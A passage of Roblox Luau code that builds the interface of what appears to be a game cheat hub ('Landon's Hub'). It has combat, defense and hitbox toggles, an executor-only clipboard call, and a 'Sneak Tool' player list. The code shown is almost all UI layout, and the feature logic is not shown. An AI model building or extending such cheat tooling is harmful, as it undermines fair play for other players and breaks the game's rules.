	sidebar.BackgroundColor3 = Color3.fromRGB(101, 19, 55)
	sidebar.BackgroundTransparency = 0.15

	local sidebarStroke = Instance.new("UIStroke")
	sidebarStroke.Color = Color3.new(1, 1, 1)
	sidebarStroke.Transparency = 0.35
	sidebarStroke.Thickness = 1
	sidebarStroke.Parent = sidebar
	sidebar.BorderSizePixel = 0
	sidebar.Parent = mP

	Instance.new("UICorner",sidebar).CornerRadius =
		UDim.new(0,10)

	local sidebarLayout = Instance.new("UIListLayout")
	sidebarLayout.SortOrder = Enum.SortOrder.LayoutOrder
	sidebarLayout.Parent = sidebar

	local sidebarPadding = Instance.new("UIPadding")
	sidebarLayout.Padding = UDim.new(0, 5)
	sidebarPadding.PaddingTop = UDim.new(0, 6)
	sidebarPadding.PaddingBottom = UDim.new(0, 6)
	sidebarPadding.PaddingLeft = UDim.new(0,6)
	sidebarPadding.PaddingRight = UDim.new(0,6)
	sidebarPadding.Parent = sidebar
	
	local content = Instance.new("Frame")
	content.Name = "Content"
	content.Size = UDim2.new(1,-130,1,-56)
	content.Position = UDim2.fromOffset(124,56)
	content.Size = UDim2.new(1,-130,1,-62)
	content.BackgroundTransparency = 1
	content.Parent = mP

	local function selectTab(name)
		activeTab = name

		for tabName, page in pairs(pages) do
			page.Visible = tabName == name
		end

		for tabName, button in pairs(tabButtons) do
			local selected = tabName == name

			if tabGradients[tabName] then
				tabGradients[tabName].Enabled = selected
			end

			if tabStrokes[tabName] then
				tabStrokes[tabName].Transparency =
					selected and 0.15 or 0.85
			end

			button.TextTransparency = 1

			local label = button:FindFirstChild("ButtonText")

			if label then
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
				label.TextTransparency = 0
			end

			TweenService:Create(button, TW_FAST, {
				BackgroundTransparency = selected and 0 or 0.85,
				BackgroundColor3 = Color3.new(1, 1, 1)
			}):Play()
		end
	end

	for index,name in ipairs(tabNames) do

		local button = Instance.new("TextButton")
		button.Name = name .. "Tab"
		button.Size = UDim2.new(1, 0, 0, 30)
		button.BackgroundColor3 = Color3.new(1, 1, 1)
		button.BackgroundTransparency = 0.85
		button.BorderSizePixel = 0
		button.Text = tabIcons[name] .. "   " .. name
		button.TextColor3 = Color3.new(1, 1, 1)
		button.TextSize = 12
		button.Font = Enum.Font.GothamBold
		button.TextXAlignment = Enum.TextXAlignment.Left
		button.AutoButtonColor = false
		button.LayoutOrder = index
		button.Parent = sidebar

		Instance.new("UICorner", button).CornerRadius =
			UDim.new(0, 8)

		local padding = Instance.new("UIPadding")
		padding.PaddingLeft = UDim.new(0, 9)
		padding.Parent = button

		local stroke = Instance.new("UIStroke")
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.Color = Color3.fromRGB(255, 205, 230)
		stroke.Transparency = 0.85
		stroke.Thickness = 1
		stroke.Parent = button

		local gradient = addGradient(button, 90, {
			ColorSequenceKeypoint.new(0,
				Color3.fromRGB(255, 113, 183)),
			ColorSequenceKeypoint.new(0.5,
				Color3.fromRGB(218, 65, 137)),
			ColorSequenceKeypoint.new(1,
				Color3.fromRGB(153, 28, 87))
		})

		gradient.Enabled = false

		tabGradients[name] = gradient
		tabStrokes[name] = stroke
		tabButtons[name] = button

		whiteButtonText(button)
		
		local page = Instance.new("ScrollingFrame")
		page.Name = name.."Page"
		page.Size = UDim2.fromScale(1,1)
		page.BackgroundTransparency = 1
		page.BorderSizePixel = 0
		page.ScrollBarThickness = 3
		page.ScrollBarImageColor3 = C_KEY
		page.CanvasSize = UDim2.fromOffset(0,0)
		page.AutomaticCanvasSize = Enum.AutomaticSize.Y
		page.ScrollingDirection = Enum.ScrollingDirection.Y
		page.Visible = false
		page.Parent = content
		page.ScrollBarImageTransparency = 0.2
		page.ClipsDescendants = true
		page.ElasticBehavior = Enum.ElasticBehavior.Never

		local layout = Instance.new("UIListLayout")
		layout.SortOrder = Enum.SortOrder.LayoutOrder
		layout.Padding = UDim.new(0,8)
		layout.Parent = page

		local padding = Instance.new("UIPadding")
		padding.PaddingTop = UDim.new(0,4)
		padding.PaddingLeft = UDim.new(0,4)
		padding.PaddingRight = UDim.new(0,4)
		padding.PaddingBottom = UDim.new(0,6)
		padding.Parent = page

		pages[name] = page

		button.Activated:Connect(function()
			selectTab(name)
		end)
	end

	selectTab("Combat")
	
	local function createRow(parent, height)
		local row = Instance.new("Frame")
		row.Size = UDim2.new(1, -8, 0, height or 42)
		row.BackgroundColor3 = Color3.new(1, 1, 1)
		row.BackgroundTransparency = 0.18
		row.BorderSizePixel = 0
		row.Parent = parent

		Instance.new("UICorner", row).CornerRadius =
			UDim.new(0, 10)

		local stroke = Instance.new("UIStroke")
		stroke.Color = Color3.new(1, 1, 1)
		stroke.Transparency = 0.25
		stroke.Thickness = 1
		stroke.Parent = row

		addGradient(row, 35, {
			ColorSequenceKeypoint.new(0,
				Color3.fromRGB(255, 255, 255)),
			ColorSequenceKeypoint.new(0.5,
				Color3.fromRGB(255, 237, 247)),
			ColorSequenceKeypoint.new(1,
				Color3.fromRGB(248, 205, 226))
		})

		return row
	end
	
	local function createSection(parent, title, description)
		local section = Instance.new("Frame")
		section.Size = UDim2.new(1, -8, 0, 46)
		section.BackgroundColor3 = Color3.fromRGB(101, 19, 55)
		section.BackgroundTransparency = 0.2
		section.BorderSizePixel = 0

		Instance.new("UICorner", section).CornerRadius =
			UDim.new(0, 8)
		section.LayoutOrder = -100
		section.Parent = parent

		local heading = Instance.new("TextLabel")
		heading.Size = UDim2.new(1, -16, 0, 24)
		heading.Position = UDim2.fromOffset(8, 0)
		heading.BackgroundTransparency = 1
		heading.Text = title
		heading.TextColor3 = Color3.fromRGB(255, 255, 255)
		heading.TextStrokeColor3 = C_TITLE
		heading.TextStrokeTransparency = 0.65
		heading.TextSize = 19
		heading.Font = Enum.Font.GothamBold
		heading.TextXAlignment = Enum.TextXAlignment.Left
		heading.Parent = section

		local subtitle = Instance.new("TextLabel")
		subtitle.Size = UDim2.new(1, -16, 0, 16)
		subtitle.Position = UDim2.fromOffset(8, 24)
		subtitle.BackgroundTransparency = 1
		subtitle.Text = description
		subtitle.TextColor3 = Color3.fromRGB(255, 220, 238)
		subtitle.TextSize = 11
		subtitle.Font = Enum.Font.GothamMedium
		subtitle.TextXAlignment = Enum.TextXAlignment.Left
		subtitle.Parent = section

		local line = Instance.new("Frame")
		line.Size = UDim2.new(1, -16, 0, 1)
		line.Position = UDim2.fromOffset(8, 44)
		line.BackgroundColor3 = C_SEP
		line.BorderSizePixel = 0
		line.Parent = section

		return section
	end
	
	local combatPage = pages["Combat"]
	local defensePage = pages["Defense"]
	local hitboxPage = pages["Hitbox"]
	local miscPage = pages["Misc"]
	local utilityPage = pages["Utility"]
	local settingsPage = pages["Settings"]
	
	createSection(combatPage,
		"Combat",
		"Combat features and preferences")

	createSection(defensePage,
		"Defense",
		"Defensive features and preferences")

	createSection(hitboxPage,
		"Hitbox",
		"Hitbox configuration")

	createSection(miscPage,
		"Miscellaneous",
		"Additional features and tools")

	createSection(utilityPage,
		"Utility",
		"General tools and preferences")
	
	local settingsHeader = createRow(settingsPage, 38)
	settingsHeader.LayoutOrder = -100

	local heading = Instance.new("TextLabel")
	heading.Size = UDim2.new(1, -20, 1, 0)
	heading.Position = UDim2.fromOffset(10, 0)
	heading.BackgroundTransparency = 1
	heading.Text = "⚙  Interface Settings"
	heading.TextColor3 = C_LABEL
	heading.TextSize = 15
	heading.Font = Enum.Font.GothamBold
	heading.TextXAlignment = Enum.TextXAlignment.Left
	heading.Parent = settingsHeader

	local settingsGrid = Instance.new("Frame")
	settingsGrid.Size = UDim2.new(1, -8, 0, 174)
	settingsGrid.BackgroundTransparency = 1
	settingsGrid.Parent = settingsPage
	settingsGrid.LayoutOrder = 1
	
	local gridLayout = Instance.new("UIGridLayout")
	gridLayout.CellSize = UDim2.new(0.5, -4, 0, 54)
	gridLayout.CellPadding = UDim2.fromOffset(8, 6)
	gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	gridLayout.Parent = settingsGrid
	
	local settingsOrder = 0
	local function settingsCard(title)
		local card = createRow(settingsGrid, 54)
		settingsOrder = settingsOrder + 1
		card.LayoutOrder = settingsOrder
		
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -16, 0, 22)
		label.Position = UDim2.fromOffset(8, 2)
		label.BackgroundTransparency = 1
		label.Text = title
		label.TextColor3 = C_LABEL
		label.TextSize = 11
		label.Font = Enum.Font.GothamBold
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Parent = card
		
		label.Name = "CardTitle"
		return card
	end
	
	local function createSlider(title, minimum, maximum, default, callback)
		local card = settingsCard(title)
		
		local cardTitle = card:FindFirstChild("CardTitle")

		if cardTitle then
			cardTitle.Size = UDim2.new(1, -58, 0, 22)
			cardTitle.TextTruncate = Enum.TextTruncate.AtEnd
		end
		
		local track = Instance.new("TextButton")
		track.Size = UDim2.new(1, -20, 0, 8)
		track.Position = UDim2.fromOffset(10, 34)
		track.BackgroundColor3 = C_OFF
		track.Text = ""
		track.AutoButtonColor = false
		track.Parent = card

		Instance.new("UICorner", track).CornerRadius =
			UDim.new(1, 0)

		local fill = Instance.new("Frame")
		fill.BackgroundColor3 = C_ON
		fill.BorderSizePixel = 0
		fill.Parent = track

		Instance.new("UICorner", fill).CornerRadius =
			UDim.new(1, 0)

		local knob = Instance.new("Frame")
		knob.Size = UDim2.fromOffset(12, 12)
		knob.AnchorPoint = Vector2.new(0.5, 0.5)
		knob.BackgroundColor3 = Color3.new(1, 1, 1)
		knob.BorderSizePixel = 0
		knob.Parent = track

		Instance.new("UICorner", knob).CornerRadius =
			UDim.new(1, 0)

		Instance.new("UIStroke", knob).Color = C_ON

		local valueLabel = Instance.new("TextLabel")
		valueLabel.Size = UDim2.fromOffset(42, 18)
		valueLabel.Position = UDim2.new(1, -46, 0, 3)
		valueLabel.BackgroundTransparency = 1
		valueLabel.TextColor3 = C_KEY
		valueLabel.TextSize = 10
		valueLabel.Font = Enum.Font.GothamBold
		valueLabel.Parent = card

		local function setValue(value)
			value = math.clamp(value, minimum, maximum)

			local percent =
				(value - minimum) / (maximum - minimum)

			fill.Size = UDim2.fromScale(percent, 1)
			knob.Position = UDim2.fromScale(percent, 0.5)

			valueLabel.Text =
				tostring(math.floor(value * 100 + 0.5)) .. "%"

			callback(value)
		end

		local activeInput

		local function update(input)
			local percent = math.clamp(
				(input.Position.X - track.AbsolutePosition.X)
					/ math.max(track.AbsoluteSize.X, 1),
				0, 1
			)

			setValue(minimum + (maximum - minimum) * percent)
		end

		track.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.Touch
				or input.UserInputType == Enum.UserInputType.MouseButton1 then
				activeInput = input
				update(input)
			end
		end)

		UIS.InputChanged:Connect(function(input)
			if not activeInput then return end

			if input == activeInput or (
				activeInput.UserInputType == Enum.UserInputType.MouseButton1
					and input.UserInputType == Enum.UserInputType.MouseMovement
				) then
				update(input)
			end
		end)

		UIS.InputEnded:Connect(function(input)
			if input == activeInput then
				activeInput = nil
			end
		end)

		setValue(default)
		return setValue
	end

	local setScale = createSlider(
		"UI Scale", 0.65, 1.15, 1,
		function(value)
			settings.Scale = value
			updateScale()
		end
	)

	local setTransparency = createSlider(
		"Transparency", 0, 0.65, 0,
		function(value)
			settings.Transparency = value
			mP.BackgroundTransparency = value
		end
	)
	
	local themes = {
		Rose = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(101,19,55)),
			ColorSequenceKeypoint.new(0.35, Color3.fromRGB(166,43,96)),
			ColorSequenceKeypoint.new(0.70, Color3.fromRGB(237,131,178)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))
		}),

		Light = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(190,75,130)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(248,195,220)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255))
		}),

		Dark = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(45,12,29)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(101,19,55)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(166,43,96))
		})
	}

	local themeNames = {"Rose", "Light", "Dark"}
	local themeIndex = 1

	local function settingsButton(card, text)
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(1, -16, 0, 24)
		btn.Position = UDim2.fromOffset(8, 24)
		btn.BackgroundColor3 = Color3.new(1, 1, 1)
		btn.BorderSizePixel = 0
		btn.Text = text
		btn.TextColor3 = Color3.new(1, 1, 1)
		btn.TextSize = 11
		btn.Font = Enum.Font.GothamBold
		btn.AutoButtonColor = false
		btn.Parent = card

		Instance.new("UICorner", btn).CornerRadius =
			UDim.new(0, 6)

		addGradient(btn, 90, {
			ColorSequenceKeypoint.new(0,
				Color3.fromRGB(192, 45, 112)),
			ColorSequenceKeypoint.new(1,
				Color3.fromRGB(153, 28, 87))
		})

		whiteButtonText(btn)

		return btn
	end

	local themeCard = settingsCard("Interface Theme")
	local themeButton = settingsButton(themeCard,"Rose")

	local function applyTheme(name)
		settings.Theme = name

		local gradient = mP:FindFirstChildOfClass("UIGradient")

		if gradient and themes[name] then
			gradient.Color = themes[name]
		end

		themeButton.Text = name
	end
	
	applyTheme("Rose")
	
	themeButton.Activated:Connect(function()
		themeIndex = themeIndex % #themeNames + 1
		applyTheme(themeNames[themeIndex])
	end)
	
	local positionCard = settingsCard("Reset Position")
	local positionButton = settingsButton(positionCard,"Reset")

	positionButton.Activated:Connect(function()
		mP.Position = defaultPanelPosition
		ToggleButton.Position = defaultStarPosition
	end)

	local resetCard = settingsCard("Reset Settings")
	local resetButton = settingsButton(resetCard,"Restore Defaults")

	resetButton.Activated:Connect(function()
		setScale(1)
		setTransparency(0)

		themeIndex = 1
		applyTheme("Rose")

		mP.Position = defaultPanelPosition
		ToggleButton.Position = defaultStarPosition
	end)
	
	local discordCard = settingsCard("Discord Community")
	local discordButton = settingsButton(discordCard,"Copy Invite")

	discordButton.Activated:Connect(function()
		if setclipboard then
			local success = pcall(
				setclipboard,
				"https://discord.gg/bandzz"
			)

			discordButton.Text =
				success and "Copied!" or "Copy Failed"
		else
			discordButton.Text = "Unavailable"
		end

		task.delay(2,function()
			if discordButton.Parent then
				discordButton.Text = "Copy Invite"
			end
		end)
	end)
	
	local function createCategory(parent, title, order)
		local category = Instance.new("TextLabel")
		category.Name = "Category"
		category.Size = UDim2.new(1, -8, 0, 22)
		category.BackgroundTransparency = 1
		category.Text = string.upper(title)
		category.TextColor3 = Color3.fromRGB(255, 255, 255)
		category.TextStrokeColor3 = C_TITLE
		category.TextStrokeTransparency = 0.3
		category.TextSize = 10
		category.Font = Enum.Font.GothamBold
		category.TextXAlignment = Enum.TextXAlignment.Left
		category.LayoutOrder = order or 0
		category.Parent = parent

		local padding = Instance.new("UIPadding")
		padding.PaddingLeft = UDim.new(0, 6)
		padding.Parent = category

		return category
	end
	
	local function createInfoCard(parent, title, description, order)
		local card = createRow(parent, 58)
		card.LayoutOrder = order or 0

		local heading = Instance.new("TextLabel")
		heading.Size = UDim2.new(1, -24, 0, 20)
		heading.Position = UDim2.fromOffset(12, 6)
		heading.BackgroundTransparency = 1
		heading.Text = title
		heading.TextColor3 = C_LABEL
		heading.TextSize = 13
		heading.Font = Enum.Font.GothamBold
		heading.TextXAlignment = Enum.TextXAlignment.Left
		heading.Parent = card

		local descriptionLabel = Instance.new("TextLabel")
		descriptionLabel.Size = UDim2.new(1, -24, 0, 26)
		descriptionLabel.Position = UDim2.fromOffset(12, 26)
		descriptionLabel.BackgroundTransparency = 1
		descriptionLabel.Text = description
		descriptionLabel.TextColor3 = C_DIM
		descriptionLabel.TextSize = 11
		descriptionLabel.Font = Enum.Font.Gotham
		descriptionLabel.TextWrapped = true
		descriptionLabel.TextXAlignment = Enum.TextXAlignment.Left
		descriptionLabel.Parent = card

		return card
	end
	
	local mOrder=0
	local function mToggle(parent, feat)
		mOrder = mOrder + 1

		local row = createRow(parent, 42)
		row.LayoutOrder = mOrder

		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -100, 1, 0)
		label.Position = UDim2.fromOffset(14, 0)
		label.BackgroundTransparency = 1
		label.Text = feat.name
		label.TextColor3 = C_LABEL
		label.TextSize = 13
		label.Font = Enum.Font.GothamBold
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Parent = row
		label.TextTruncate = Enum.TextTruncate.AtEnd
		label.TextWrapped = false

		local toggle = Instance.new("TextButton")
		toggle.Size = UDim2.fromOffset(62, 26)
		toggle.Position = UDim2.new(1, -74, 0.5, -13)
		toggle.BackgroundColor3 = Color3.new(1, 1, 1)
		toggle.BorderSizePixel = 0
		toggle.Text = ""
		toggle.AutoButtonColor = false
		toggle.Parent = row

		Instance.new("UICorner", toggle).CornerRadius =
			UDim.new(1, 0)

		local gradient = addGradient(toggle, 90, {
			ColorSequenceKeypoint.new(0,
				Color3.fromRGB(218, 65, 137)),
			ColorSequenceKeypoint.new(1,
				Color3.fromRGB(153, 28, 87))
		})

		local knob = Instance.new("Frame")
		knob.Size = UDim2.fromOffset(20, 20)
		knob.BackgroundColor3 = Color3.new(1, 1, 1)
		knob.BorderSizePixel = 0
		knob.ZIndex = toggle.ZIndex + 2
		knob.Parent = toggle

		Instance.new("UICorner", knob).CornerRadius =
			UDim.new(1, 0)

		local stateLabel = Instance.new("TextLabel")
		stateLabel.Size = UDim2.fromOffset(34, 26)
		stateLabel.BackgroundTransparency = 1
		stateLabel.TextSize = 10
		stateLabel.Font = Enum.Font.GothamBold
		stateLabel.TextColor3 = Color3.new(1, 1, 1)
		stateLabel.ZIndex = toggle.ZIndex + 1
		stateLabel.Parent = toggle

		local function update()
			gradient.Enabled = feat.state

			toggle.BackgroundColor3 = feat.state
				and Color3.new(1, 1, 1)
				or Color3.fromRGB(116, 83, 101)

			knob.Position = feat.state
				and UDim2.fromOffset(39, 3)
				or UDim2.fromOffset(3, 3)

			stateLabel.Position = feat.state
				and UDim2.fromOffset(3, 0)
				or UDim2.fromOffset(25, 0)

			stateLabel.Text = feat.state and "ON" or "OFF"
		end

		local busy = false

		toggle.Activated:Connect(function()
			if busy then return end
			busy = true

			feat.state = not feat.state

			local success, err = pcall(function()
				if feat.state then
					feat.onActivate()
				else
					feat.onDeactivate()
				end
			end)

			if not success then
				feat.state = not feat.state
				warn(err)
			end

			update()
			busy = false
		end)

		update()
	end

	local function mInput(parent, ph, btnT, btnC, cb)
		mOrder = mOrder + 1

		local row = createRow(parent, 46)
		row.LayoutOrder = mOrder

		local box = Instance.new("TextBox")
		box.Size = UDim2.new(0.65, -12, 0, 32)
		box.Position = UDim2.new(0, 8, 0.5, -16)
		box.BackgroundColor3 = Color3.fromRGB(255, 248, 252)
		box.BorderSizePixel = 0
		box.Text = ""
		box.TextColor3 = C_LABEL
		box.PlaceholderText = ph
		box.PlaceholderColor3 = C_DIM
		box.TextSize = 12
		box.Font = Enum.Font.Gotham
		box.ClearTextOnFocus = false
		box.Parent = row

		Instance.new("UICorner", box).CornerRadius =
			UDim.new(0, 8)

		local stroke = Instance.new("UIStroke")
		stroke.Color = C_SEP
		stroke.Thickness = 1
		stroke.Parent = box

		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(0.35, -10, 0, 32)
		btn.Position = UDim2.new(0.65, 2, 0.5, -16)
		btn.BackgroundColor3 = Color3.new(1, 1, 1)
		btn.BorderSizePixel = 0
		btn.Text = btnT
		btn.TextColor3 = Color3.new(1, 1, 1)
		btn.TextSize = 12
		btn.Font = Enum.Font.GothamBold
		btn.AutoButtonColor = false
		btn.Parent = row

		Instance.new("UICorner", btn).CornerRadius =
			UDim.new(0, 8)

		addGradient(btn, 90, {
			ColorSequenceKeypoint.new(0, C_ON),
			ColorSequenceKeypoint.new(1, C_TITLE)
		})

		whiteButtonText(btn)

		btn.Activated:Connect(function()
			cb(box.Text)
		end)

		return box
	end
	
	local function addControl(parent, feature)
		assert(type(feature) == "table", "Expected feature table")
		assert(type(feature.name) == "string", "Missing feature name")
		assert(type(feature.state) == "boolean", "Invalid feature state")
		assert(type(feature.onActivate) == "function", "Missing activation callback")
		assert(type(feature.onDeactivate) == "function", "Missing deactivation callback")

		mToggle(parent, feature)
	end

	-- Combat
	createCategory(combatPage, "Combat Features", 0)

	addControl(combatPage, fCombo)
	addControl(combatPage, fStomp)

	-- Defense
	createCategory(defensePage, "Defense Features", 0)

	addControl(defensePage, fBlock)
	addControl(defensePage, fEscape)
	addControl(defensePage, fLoose)
	addControl(defensePage, fBeatDn)
	addControl(defensePage, fDuo)
	
	createCategory(utilityPage, "Information", 1)

	createInfoCard(
		utilityPage,
		"Landon's Hub",
		"Official interface for Landon's Worksite.",
		2
	)

	createInfoCard(
		utilityPage,
		"Interface Version",
		"Version 1.0 • Rose Edition",
		3
	)

	createInfoCard(
		utilityPage,
		"Compatibility",
		"Designed for mobile and desktop layouts.",
		4
	)
	
	mOrder=mOrder+1
	local mSneak=Instance.new("TextButton"); mSneak.Size=UDim2.new(1,-8,0,52)
	mSneak.BackgroundColor3=Color3.fromRGB(120,30,70); mSneak.BorderSizePixel=0
	mSneak.Text="🕵 Sneak Tool ▸ Open"; mSneak.TextColor3=Color3.fromRGB(255,120,190)
	mSneak.TextSize=14; mSneak.Font=Enum.Font.GothamBold; mSneak.LayoutOrder=mOrder; mSneak.Parent=miscPage
	Instance.new("UICorner",mSneak).CornerRadius=UDim.new(0,10)
	
	mSneak.BackgroundColor3 = Color3.new(1, 1, 1)
	mSneak.TextColor3 = Color3.new(1, 1, 1)
	mSneak.AutoButtonColor = false

	addGradient(mSneak, 90, {
		ColorSequenceKeypoint.new(0, C_ON),
		ColorSequenceKeypoint.new(1, C_TITLE)
	})

	whiteButtonText(mSneak)
	
	local sneakGui = playerGui:FindFirstChild("LANDONS_SNEAK")

	if sneakGui then
		local function updateSneakButton()
			mSneak.Text = sneakGui.Enabled
				and "🕵 Sneak Tool ▸ Close"
				or "🕵 Sneak Tool ▸ Open"
		end

		mSneak.Activated:Connect(function()
			sneakGui.Enabled = not sneakGui.Enabled
		end)

		sneakGui:GetPropertyChangedSignal("Enabled")
			:Connect(updateSneakButton)

		updateSneakButton()
	end
end

local function buildSneakPanel()
	local ssg=Instance.new("ScreenGui"); ssg.Name="LANDONS_SNEAK"; ssg.ResetOnSpawn=false
	ssg.IgnoreGuiInset=false; ssg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
	ssg.Enabled=false; ssg.Parent=playerGui
	ssg.DisplayOrder = 100

	local sp=Instance.new("Frame")
	sp.Size = UDim2.new(0, 240, 0, 300)
	sp.Position = UDim2.new(0.5, -120, 0.5, -150)
	sp.BackgroundColor3=C_BG
	sp.BorderSizePixel=0
	sp.Active=true
	sp.Parent=ssg
	sp.BackgroundColor3 = Color3.new(1, 1, 1)

	addGradient(sp, 115, {
		ColorSequenceKeypoint.new(0,
			Color3.fromRGB(101, 19, 55)),
		ColorSequenceKeypoint.new(0.35,
			Color3.fromRGB(166, 43, 96)),
		ColorSequenceKeypoint.new(0.7,
			Color3.fromRGB(237, 131, 178)),
		ColorSequenceKeypoint.new(1,
			Color3.fromRGB(255, 255, 255))
	})
	Instance.new("UICorner",sp).CornerRadius=UDim.new(0,14)

	local spStroke=Instance.new("UIStroke")
	spStroke.Color=C_SEP
	spStroke.Thickness=1
	spStroke.Parent=sp

	local sb=Instance.new("Frame")
	sb.Size=UDim2.new(1,0,0,44)
	sb.BackgroundColor3 = Color3.fromRGB(65, 12, 36)
	sb.BackgroundTransparency = 0.25
	sb.Active = true
	sb.BorderSizePixel=0
	sb.Parent=sp
	Instance.new("UICorner",sb).CornerRadius=UDim.new(0,14)

	local sbf=Instance.new("Frame")
	sbf.Size=UDim2.new(1,0,0,14)
	sbf.Position=UDim2.new(0,0,1,-14)
	sbf.BackgroundTransparency = 1
	sbf.BorderSizePixel=0
	sbf.Parent=sb

	local stl2=Instance.new("TextLabel")
	stl2.Size = UDim2.new(1, -50, 0, 24)
	stl2.Position = UDim2.fromOffset(12, 3)
	stl2.BackgroundTransparency=1
	stl2.Text = "Sneak Tool"
	stl2.TextColor3 = Color3.fromRGB(255, 255, 255)
	stl2.TextSize = 17
	stl2.Font = Enum.Font.GothamBold
	stl2.TextXAlignment=Enum.TextXAlignment.Left
	stl2.Parent=sb
	
	local playerCount = Instance.new("TextLabel")
	playerCount.Size = UDim2.new(1, -50, 0, 14)
	playerCount.Position = UDim2.fromOffset(12, 26)
	playerCount.BackgroundTransparency = 1
	playerCount.TextColor3 = Color3.fromRGB(251, 213, 231)
	playerCount.TextSize = 10
	playerCount.Font = Enum.Font.GothamMedium
	playerCount.TextXAlignment = Enum.TextXAlignment.Left
	playerCount.Parent = sb

	local function updatePlayerCount()
		local count = math.max(0, #Players:GetPlayers() - 1)

		playerCount.Text = tostring(count)
			.. (count == 1 and " player available"
				or " players available")
	end

	Players.PlayerAdded:Connect(function()
		task.defer(updatePlayerCount)
	end)

	Players.PlayerRemoving:Connect(function()
		task.delay(0.1, updatePlayerCount)
	end)

	updatePlayerCount()

	local cb=Instance.new("TextButton"); cb.Size=UDim2.new(0,24,0,24); cb.Position=UDim2.new(1,-30,0.5,-12)
	cb.BackgroundColor3=C_ON; cb.BorderSizePixel=0; cb.Text="✕"; cb.TextColor3=Color3.new(1,1,1)
	cb.TextSize=12; cb.Font=Enum.Font.GothamBold; cb.Parent=sb
	Instance.new("UICorner",cb).CornerRadius=UDim.new(1,0); cb.MouseButton1Click:Connect(function() ssg.Enabled=false end)

	local sdrag,sds,ssp=false,nil,nil
	sb.InputBegan:Connect(function(i)
		if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
			sdrag=true; sds=UIS:GetMouseLocation(); ssp=sp.Position
		end
	end)
	sb.InputEnded:Connect(function(i)
		if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then sdrag=false end
	end)
	UIS.InputChanged:Connect(function(i)
		if sdrag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
			local d=UIS:GetMouseLocation()-sds; sp.Position=UDim2.new(ssp.X.Scale,ssp.X.Offset+d.X,ssp.Y.Scale,ssp.Y.Offset+d.Y)
		end
	end)

	local statusLbl=Instance.new("TextLabel")
	statusLbl.Size=UDim2.new(1,-12,0,20)
	statusLbl.Position=UDim2.new(0,6,1,-24)
	statusLbl.BackgroundTransparency=1
	statusLbl.Text = "Select a player"
	statusLbl.TextColor3 = C_LABEL
	statusLbl.TextSize=10
	statusLbl.Font = Enum.Font.GothamMedium
	statusLbl.Parent=sp
	statusLbl.TextTruncate = Enum.TextTruncate.AtEnd
	statusLbl.TextXAlignment = Enum.TextXAlignment.Center

	local ss2=Instance.new("ScrollingFrame")
	ss2.Size=UDim2.new(1,-8,1,-72)
	ss2.Position=UDim2.new(0,4,0,48)
	ss2.BackgroundTransparency=1
	ss2.BorderSizePixel=0
	ss2.ScrollBarThickness=3
	ss2.ScrollBarImageTransparency = 0.2
	ss2.ScrollBarImageColor3 = C_KEY
	ss2.CanvasSize=UDim2.new(0,0,0,0)
	ss2.AutomaticCanvasSize = Enum.AutomaticSize.Y
	ss2.Parent=sp
	ss2.ZIndex = 4
	ss2.ScrollingDirection = Enum.ScrollingDirection.Y
	ss2.ElasticBehavior = Enum.ElasticBehavior.Never
	ss2.ClipsDescendants = true

	local sl=Instance.new("UIListLayout")
	sl.SortOrder=Enum.SortOrder.Name
	sl.Padding=UDim.new(0,6)
	sl.Parent=ss2

	local spd=Instance.new("UIPadding"); spd.PaddingTop=UDim.new(0,4); spd.PaddingLeft=UDim.new(0,2)
	spd.PaddingRight=UDim.new(0,2); spd.Parent=ss2

	local pRows2={}
	local function buildSRow(other)
		if pRows2[other] then return end

		local row=Instance.new("TextButton")
		row.Size = UDim2.new(1,-8,0,54)
		row.BackgroundColor3 = C_INPUT
		row.BackgroundTransparency = 0.12
		row.AutoButtonColor = false
		row.BorderSizePixel=0
		row.Text = ""
		row.ClipsDescendants = true
		row.TextColor3=C_LABEL
		row.TextSize=12
		row.Font=Enum.Font.GothamBold
		row.TextXAlignment=Enum.TextXAlignment.Left
		row.Name = other.Name
		row.Active = true
		row.ZIndex = 5
		row.Parent = ss2
		Instance.new("UICorner",row).CornerRadius=UDim.new(0,10)

		local avatar = Instance.new("ImageLabel")
		avatar.Name = "PlayerAvatar"
		avatar.Size = UDim2.fromOffset(38, 38)
		avatar.Position = UDim2.new(0, 8, 0.5, -19)
		avatar.BackgroundColor3 = C_OFF
		avatar.BorderSizePixel = 0
		avatar.ScaleType = Enum.ScaleType.Crop
		avatar.ZIndex = row.ZIndex + 1
		avatar.Parent = row

		Instance.new("UICorner", avatar).CornerRadius =
			UDim.new(1, 0)

		local avatarStroke = Instance.new("UIStroke")
		avatarStroke.Color = C_ON
		avatarStroke.Thickness = 1.5
		avatarStroke.Transparency = 0.2
		avatarStroke.Parent = avatar

		task.spawn(function()
			local success, image = pcall(function()
				return Players:GetUserThumbnailAsync(
					other.UserId,
					Enum.ThumbnailType.HeadShot,
					Enum.ThumbnailSize.Size150x150
				)
			end)

			if success and avatar.Parent then
				avatar.Image = image
			end
		end)

		local displayName = Instance.new("TextLabel")
		displayName.Size = UDim2.new(1, -64, 0, 20)
		displayName.Position = UDim2.fromOffset(56, 9)
		displayName.BackgroundTransparency = 1
		displayName.Text = other.DisplayName
		displayName.TextColor3 = C_LABEL
		displayName.TextSize = 13
		displayName.Font = Enum.Font.GothamBold
		displayName.TextXAlignment = Enum.TextXAlignment.Left
